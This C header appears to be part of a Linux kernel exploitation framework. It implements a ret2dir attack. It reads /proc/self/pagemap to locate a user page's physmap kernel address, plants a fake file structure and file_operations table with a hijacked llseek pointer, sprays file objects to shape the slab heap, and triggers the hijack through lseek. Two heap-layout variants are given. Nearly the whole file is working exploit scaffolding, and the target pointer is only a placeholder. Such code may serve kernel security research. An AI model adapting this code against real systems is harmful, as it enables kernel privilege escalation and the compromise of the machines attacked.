#ifndef _FILE_TMPL_H_
#define _FILE_TMPL_H_

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>

// for ret2dir
#define PHYS_OFFSET 0xffff880000000000
#define PFN_MIN 0
#define PAGE_SIZE 0x1000
#define USER_ADDR 0x40000000
#define PAGE_SHIFT 12

#define KMALLOC_SIZE 256

#ifdef FENGSHUI1

struct file {
    char hole1[0x28];
    void *f_op;
    char hole2[0x14];
    unsigned int f_mode;
    char hole3[0xb8];
};

struct file_operations {
    char hole1[0x8];
    void* llseek;
    void* read;
    char hole2[0xd8];
};
struct file fake_file;
struct file_operations fake_file_operations;

unsigned overwrite_start = 0x28;
unsigned overwrite_end = 0x30;

void* victim_obj = (void*)&fake_file;

int fd;
uint64_t kaddr = 0;

void do_setup_physmap() {
    void* uaddr = (void*)USER_ADDR;
    void* raddr = NULL;
    void* ret = NULL;
    char file_name[30];
    sprintf(file_name, "/proc/%d/pagemap", getpid());
    int fd = open(file_name, O_RDONLY);
    if (fd < 0) {
        perror("open failed");
		goto err;
    }
    uint64_t v = 0;
    uint64_t pfn = 0;

    munmap(uaddr, PAGE_SIZE);
    raddr = mmap(uaddr, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    if(raddr == MAP_FAILED) {
        perror("mmap failed");
        goto err;
    }
    // necessary due to lazy allocation
    memset(raddr, 0, PAGE_SIZE);
    lseek(fd, ((uint64_t)uaddr >> PAGE_SHIFT)*sizeof(uint64_t), SEEK_SET);
    read(fd, &v, sizeof(uint64_t));
    if (v & (1UL << 63)) {
        pfn = v & ((1UL << 55) - 1);
        fprintf(stdout, "pfn: 0x%lx\n", pfn);
        kaddr = PHYS_OFFSET + 0x1000 * (pfn-PFN_MIN);
        fprintf(stdout, "kaddr: 0x%lx\n", kaddr);
        ret = (void*)kaddr;
		memset(&fake_file, 0x00, sizeof(struct file));
		fake_file.f_op = (void*)kaddr;
		fake_file.f_mode = 0x5801e;
		fake_file_operations.llseek = (void*)0xffffffffdeadbeef;
		memset((void*)USER_ADDR, 0xff, PAGE_SIZE);
		memcpy((void*)USER_ADDR, &fake_file_operations, sizeof(struct file_operations));
    }
	return;
err:
	close(fd);
	exit(-1);
}

// int fd[64];
/*
 *  open files to allocate file structures and
 *  cause allocation of at least one new slab which is right after
 *  the second block
 */
void do_alloc_victim() {
	fd = open("test100", O_CREAT);
}

void do_hijack() {
	lseek(fd, 0, SEEK_SET);
}

#endif // FENGSHUI1

#ifdef FENGSHUI4
struct file {
    char hole1[0x28];
    void *f_op;
    char hole2[0x14];
    unsigned int f_mode;
    char hole3[0xb8];
};

struct file_operations {
    char hole1[0x8];
    void* llseek;
    void* read;
    char hole2[0xd8];
};
struct file fake_file;
struct file_operations fake_file_operations;

char array[KMALLOC_SIZE];

void* victim_obj = (void*)array;

unsigned overwrite_start = 0x0;
unsigned overwrite_end = 0x30;

int fd[64];
uint64_t kaddr = 0xffffffffdeadbeef;

void do_setup_physmap() {
	return;

	memset(array, 0xff, KMALLOC_SIZE);

    void* uaddr = (void*)USER_ADDR;
    void* raddr = NULL;
    void* ret = NULL;
    char file_name[30];
    sprintf(file_name, "/proc/%d/pagemap", getpid());
    int fd = open(file_name, O_RDONLY);
    if (fd < 0) {
        perror("open failed");
		goto err;
    }
    uint64_t v = 0;
    uint64_t pfn = 0;

    munmap(uaddr, PAGE_SIZE);
    raddr = mmap(uaddr, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    if(raddr == MAP_FAILED) {
        perror("mmap failed");
        goto err;
    }
    // necessary due to lazy allocation
    memset(raddr, 0, PAGE_SIZE);
    lseek(fd, ((uint64_t)uaddr >> PAGE_SHIFT)*sizeof(uint64_t), SEEK_SET);
    read(fd, &v, sizeof(uint64_t));
    if (v & (1UL << 63)) {
        pfn = v & ((1UL << 55) - 1);
        fprintf(stdout, "pfn: 0x%lx\n", pfn);
        kaddr = PHYS_OFFSET + 0x1000 * (pfn-PFN_MIN);
        fprintf(stdout, "kaddr: 0x%lx\n", kaddr);
        ret = (void*)kaddr;
		memset(&fake_file, 0x00, sizeof(struct file));
		fake_file.f_op = (void*)(kaddr+sizeof(struct file));
		fake_file.f_mode = 0x5801e;

		fake_file_operations.llseek = (void*)0xffffffffdeadbeef;
		memset((void*)USER_ADDR, 0x00, PAGE_SIZE);
		memcpy((void*)USER_ADDR+sizeof(struct file), &fake_file_operations, sizeof(struct file_operations));
    }
	return;
err:
	close(fd);
	exit(-1);
}

/*
 *  open files to allocate file structures and
 *  cause allocation of at least one new slab which is right after
 *  the second block
 */
void do_alloc_victim() {
	int i = 0;
	char filename[10];
	memset(filename, 0, 10);
	for (i = 0; i < 64; i++) {
		sprintf(filename, "test%d", i);
		fd[i] = open(filename, O_CREAT);
		if (fd[i] < 0) {
			perror("alloc_file\n");
			exit(-1);
		}
	}
	return;
}

void do_hijack() {
	// overflow will occupy some bytes of the file object
	// right before victim file object which makes it 
	// fragile. Therefore, we lseek inversely
	memcpy((void*)USER_ADDR, &fake_file, sizeof(struct file));
	int i = 0;
	for (i = 63; i >= 0; i--) {
		lseek(fd[i], 0, SEEK_SET);
	}
}

#endif // FENGSHUI4

#endif
